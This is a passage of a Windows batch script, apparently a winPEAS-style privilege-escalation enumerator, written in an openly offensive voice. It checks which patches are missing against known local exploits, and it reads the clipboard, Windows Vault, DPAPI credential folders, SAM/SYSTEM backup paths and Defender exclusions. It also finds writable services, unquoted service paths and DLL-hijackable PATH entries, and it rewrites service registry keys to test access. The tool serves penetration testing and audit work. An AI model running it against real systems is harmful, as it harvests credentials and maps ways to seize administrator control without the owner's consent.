for /f "tokens=3-9" %%a in ('systeminfo') do (echo "%%a %%b %%c %%d %%e %%f %%g" | findstr /i "2000 XP 2003 2008 vista" && set expl=yes) & (echo "%%a %%b %%c %%d %%e %%f %%g" | findstr /i /C:"windows 7" && set expl=yes)
IF "%expl%" == "yes" echo [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2592799" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS11-080 patch is NOT installed! (Vulns: XP/SP3,2K3/SP3-afd.sys)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3143141" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS16-032 patch is NOT installed! (Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS11-011 patch is NOT installed! (Vulns: XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB982799" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-59 patch is NOT installed! (Vulns: 2K8,Vista,7/SP0-Chimichurri)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979683" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-21 patch is NOT installed! (Vulns: 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2305420" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-092 patch is NOT installed! (Vulns: 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB981957" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-073 patch is NOT installed! (Vulns: XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB4013081" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS17-017 patch is NOT installed! (Vulns: 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB977165" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-015 patch is NOT installed! (Vulns: 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB941693" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS08-025 patch is NOT installed! (Vulns: 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB920958" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS06-049 patch is NOT installed! (Vulns: 2K/SP4-ZwQuerySysInfo)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB914389" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS06-030 patch is NOT installed! (Vulns: 2K,XP/SP2-Mrxsmb.sys)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB908523" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS05-055 patch is NOT installed! (Vulns: 2K/SP4-APC Data-Free)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB890859" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS05-018 patch is NOT installed! (Vulns: 2K/SP3/4,XP/SP1/2-CSRSS)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB842526" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS04-019 patch is NOT installed! (Vulns: 2K/SP2/3/4-Utility Manager)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB835732" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS04-011 patch is NOT installed! (Vulns: 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB841872" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS04-020 patch is NOT installed! (Vulns: 2K/SP4-POSIX)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2975684" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS14-040 patch is NOT installed! (Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3136041" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS16-016 patch is NOT installed! (Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3057191" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS15-051 patch is NOT installed! (Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2989935" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS14-070 patch is NOT installed! (Vulns: 2K3/SP2-TCP/IP)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2778930" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS13-005 patch is NOT installed! (Vulns: Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2850851" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS13-053 patch is NOT installed! (Vulns: 7SP0/SP1_x86-schlamperei)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2870008" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS13-081 patch is NOT installed! (Vulns: 7SP0/SP1_x86-track_popup_menu)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] DATE and TIME ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] You may need to adjust your local date/time to exploit some vulnerability
date /T
time /T
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Audit Settings ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check what is being logged
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WEF Settings ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check where are being sent the logs
REG QUERY HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] LAPS installed? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check what is being logged
REG QUERY "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] LSA protection? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Active if "1"
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA" /v RunAsPPL
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Credential Guard? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Active if "1" or "2"
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WDigest? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Plain-text creds in memory if "1"
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Number of cached creds ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] You need System to extract them
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CACHEDLOGONSCOUNT
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] UAC Settings ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Registered Anti-Virus(AV) ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more 
echo.
echo.
echo Checking for defender whitelisted PATHS
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] PS settings ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo PowerShell v2 Version:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine /v PowerShellVersion
echo PowerShell v5 Version:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine /v PowerShellVersion
echo Transcriptions Settings:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
echo Module logging settings:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging
echo Scriptblog logging settings:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
echo.
echo PS default transcript history
dir %SystemDrive%\transcripts\
echo.
echo Checking PS history file
dir "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] MOUNTED DISKS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Maybe you find something interesting
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] ENVIRONMENT ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Interesting information?
set
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] INSTALLED SOFTWARE ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Some weird software? Check for vulnerabilities in unknow software installed
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
dir /b "C:\Program Files" "C:\Program Files (x86)" | sort
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr InstallLocation | findstr ":\\"
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\ /s | findstr InstallLocation | findstr ":\\"
IF exist C:\Windows\CCM\SCClient.exe echo SCCM is installed (installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Remote Desktop Credentials Manager ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
IF exist "%AppLocal%\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings" echo Found: RDCMan.settings in %AppLocal%\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings, check for credentials in .rdg files
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WSUS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\ 2>nul | findstr /i "wuserver" | findstr /i "http://"
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] RUNNING PROCESSES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Something unexpected is running? Check for vulnerabilities
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
tasklist /SVC
echo.
echo [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
echo.
echo [i] Checking directory permissions of running processes (DLL injection)
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] RUN ^AT STARTUP ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
::(autorunsc.exe -m -nobanner -a * -ct /accepteula 2>nul || wmic startup get caption,command 2>nul | more & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
icacls "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "C:\Documents and Settings\%username%\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab informa")
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] AlwaysInstallElevated? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] If '1' then you can install a .msi file with admin privileges ;)
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2> nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2> nul
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] NETWORK ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CURRENT SHARES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net share
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] INTERFACES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
ipconfig  /all
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] USED PORTS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check for services restricted from the outside
netstat -ano | findstr /i listen
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] FIREWALL ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
netsh firewall show state
netsh firewall show config
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] ^ARP ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
arp -A
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] ROUTES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
route print
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Hosts file ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
type C:\WINDOWS\System32\drivers\etc\hosts | findstr /v "^#"
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CACHE DNS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WIFI ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] To get the clear-text password use: netsh wlan show profile <SSID> key=clear
netsh wlan show profile
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^>[*] BASIC USER INFO ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CURRENT USER ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net user %username%
net user %USERNAME% /domain 2>nul
whoami /all
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] USERS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net user
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] GROUPS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net localgroup
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] ADMINISTRATORS GROUPS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net localgroup Administrators 2>nul
net localgroup Administradores 2>nul
echo. 
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CURRENT LOGGED USERS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
quser
echo. 
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Kerberos Tickets ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
klist
echo. 
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CURRENT CLIPBOARD ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Any password inside the clipboard?
powershell -command "Get-Clipboard" 2>nul
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] SERVICES VULNERABILITIES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
::echo.
::echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] SERVICE PERMISSIONS WITH accesschk.exe FOR 'Authenticated users', Everyone, BUILTIN\Users, Todos and CURRENT USER ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
::echo [i] If Authenticated Users have SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG or WRITE_DAC or WRITE_OWNER or GENERIC_WRITE or GENERIC_ALL, you can modify the binary that is going to be executed by the service and start/stop the service
::echo [i] If accesschk.exe is not in PATH, nothing will be found here
::echo [I] AUTHETICATED USERS
::accesschk.exe -uwcqv "Authenticated Users" * /accepteula 2>nul
::echo [I] EVERYONE
::accesschk.exe -uwcqv "Everyone" * /accepteula 2>nul
::echo [I] BUILTIN\Users
::accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
::echo [I] TODOS
::accesschk.exe -uwcqv "Todos" * /accepteula 2>nul
::echo [I] %USERNAME%
::accesschk.exe -uwcqv %username% * /accepteula 2>nul
::echo.
::echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] SERVICE PERMISSIONS WITH accesschk.exe FOR * ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
::echo [i] Check for weird service permissions for unexpected groups"
::accesschk.exe -uwcqv * /accepteula 2>nul

echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] SERVICE BINARY PERMISSIONS WITH WMIC + ICACLS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
for /f "tokens=2 delims='='" %%a in ('cmd.exe /c wmic service list full ^| findstr /i "pathname" ^|findstr /i /v "system32"') do (
    for /f eol^=^"^ delims^=^" %%b in ("%%a") do icacls "%%b" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos usuarios %username%" && echo.
)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
for /f %%a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv >nul 2>&1 & reg save %%a %temp%\reg.hiv >nul 2>&1 && reg restore %%a %temp%\reg.hiv >nul 2>&1 && echo You can modify %%a
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] UNQUOTED SERVICE PATHS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Progam.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'
echo [i] The permissions are also checked and filtered using icacls
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s ^| findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
::wmic service get name,displayname,pathname,startmode | more | findstr /i /v "C:\\Windows\\system32\\" | findstr /i /v """
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] DLL HIJACKING in PATHenv variable ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations
echo [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] CREDENTIALS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WINDOWS VAULT ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault
cmdkey /list
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] DPAPI MASTER KEYS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
powershell -command "Get-ChildItem %appdata%\Microsoft\Protect" 2>nul
powershell -command "Get-ChildItem %localappdata%\Microsoft\Protect" 2>nul
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] DPAPI MASTER KEYS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt
echo [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
echo Looking inside %appdata%\Microsoft\Credentials\
dir /b/a %appdata%\Microsoft\Credentials\ 2>nul 
echo Looking inside %localappdata%\Microsoft\Credentials\
dir /b/a %localappdata%\Microsoft\Credentials\ 2>nul
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Unattended files ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
IF EXIST %WINDIR%\sysprep\sysprep.xml ECHO %WINDIR%\sysprep\sysprep.xml exists. 
IF EXIST %WINDIR%\sysprep\sysprep.inf ECHO %WINDIR%\sysprep\sysprep.inf exists. 
IF EXIST %WINDIR%\sysprep.inf ECHO %WINDIR%\sysprep.inf exists. 
IF EXIST %WINDIR%\Panther\Unattended.xml ECHO %WINDIR%\Panther\Unattended.xml exists. 
IF EXIST %WINDIR%\Panther\Unattend.xml ECHO %WINDIR%\Panther\Unattend.xml exists. 
IF EXIST %WINDIR%\Panther\Unattend\Unattend.xml ECHO %WINDIR%\Panther\Unattend\Unattend.xml exists. 
IF EXIST %WINDIR%\Panther\Unattend\Unattended.xml ECHO %WINDIR%\Panther\Unattend\Unattended.xml exists.
IF EXIST %WINDIR%\System32\Sysprep\unattend.xml ECHO %WINDIR%\System32\Sysprep\unattend.xml exists.
IF EXIST %WINDIR%\System32\Sysprep\unattended.xml ECHO %WINDIR%\System32\Sysprep\unattended.xml exists.
IF EXIST %WINDIR%\..\unattend.txt ECHO %WINDIR%\..\unattend.txt exists.
IF EXIST %WINDIR%\..\unattend.inf ECHO %WINDIR%\..\unattend.inf exists. 
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] SAM & SYSTEM backups ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
IF EXIST %WINDIR%\repair\SAM ECHO %WINDIR%\repair\SAM exists. 
IF EXIST %WINDIR%\System32\config\RegBack\SAM ECHO %WINDIR%\System32\config\RegBack\SAM exists.
IF EXIST %WINDIR%\System32\config\SAM ECHO %WINDIR%\System32\config\SAM exists.
IF EXIST %WINDIR%\repair\SYSTEM ECHO %WINDIR%\repair\SYSTEM exists.
IF EXIST %WINDIR%\System32\config\SYSTEM ECHO %WINDIR%\System32\config\SYSTEM exists.
IF EXIST %WINDIR%\System32\config\RegBack\SYSTEM ECHO %WINDIR%\System32\config\RegBack\SYSTEM exists.
